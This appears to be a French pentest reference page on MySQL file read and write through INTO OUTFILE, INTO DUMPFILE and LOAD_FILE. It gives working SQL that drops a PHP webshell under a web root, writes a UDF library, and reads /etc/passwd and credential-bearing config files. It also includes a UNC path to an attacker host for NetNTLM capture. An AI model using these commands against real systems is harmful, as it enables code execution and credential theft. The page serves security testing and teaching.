---
title: "Accès aux fichiers MySQL : INTO OUTFILE et LOAD_FILE"
description: "Écrire des fichiers sur l'hôte MySQL ou MariaDB avec SELECT ... INTO OUTFILE pour déposer un webshell, et lire des fichiers de l'hôte avec LOAD_FILE, tous deux conditionnés par le privilège FILE et le paramètre secure_file_priv."
keywords:
  - INTO OUTFILE
  - LOAD_FILE
  - privilège FILE
  - secure_file_priv
  - webshell
---

# Accès aux fichiers

Avec le privilège **`FILE`**, MySQL lit et écrit des fichiers sous son compte de service. La primitive d'écriture est la plus précieuse : déposer un webshell sous une racine web est un chemin direct vers l'exécution de code, et écrire une bibliothèque dans le répertoire de plugins prépare une [UDF](command-execution.md).

## Écrire des fichiers

```sql
-- drop a webshell under a served directory
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
-- write raw bytes (e.g. a UDF .so) with DUMPFILE, which does not add row/line formatting
SELECT 0xMACHINECODE INTO DUMPFILE '/usr/lib/mysql/plugin/x.so';
```

## Lire des fichiers

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');   -- app secrets, DB creds
```

## Le verrou secure_file_priv

```sql
SELECT @@secure_file_priv;
-- '' (empty)  -> read/write anywhere
-- a directory -> confined to that path
-- NULL        -> file operations disabled
```

## Notes d'exploitation

- L'écriture du webshell est le point saillant : `INTO OUTFILE` sous la racine web transforme l'accès à la base en RCE web, à condition que le chemin soit accessible en écriture par le compte `mysql` et que `secure_file_priv` l'autorise.
- Utilisez **`INTO DUMPFILE`** (et non `OUTFILE`) pour les binaires : `OUTFILE` échappe et ajoute des séparateurs, corrompant un `.so`/`.dll` ; `DUMPFILE` écrit les octets tels quels.
- `LOAD_FILE` renvoie NULL lorsque le fichier est illisible par le compte de service ou bloqué par `secure_file_priv`, vérifiez donc ce paramètre d'abord.
- Ces opérations nécessitent le privilège `FILE`, que `root` possède par défaut ; un utilisateur de moindre niveau peut ne pas l'avoir, confirmez donc avec `SHOW GRANTS`.
- Sous MySQL **Windows**, `LOAD_FILE('\\\\<attacker>\\x')` fait s'authentifier le compte de service auprès d'un listener SMB, une primitive de [capture](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) ou de [relais](../../directory/active-directory/authentication/ntlm/relay.md) NetNTLM ; peu courant, car MySQL sous Windows est rare.

## Outils

- **mysql** : exécuter directement `INTO OUTFILE` / `LOAD_FILE`.
- **sqlmap** (`--file-write`, `--file-read`) : écriture et lecture de fichiers automatisées via injection ou connexion directe.

## Références

- [MySQL: SELECT ... INTO statement](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
- [HackTricks: MySQL file read and write](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html)
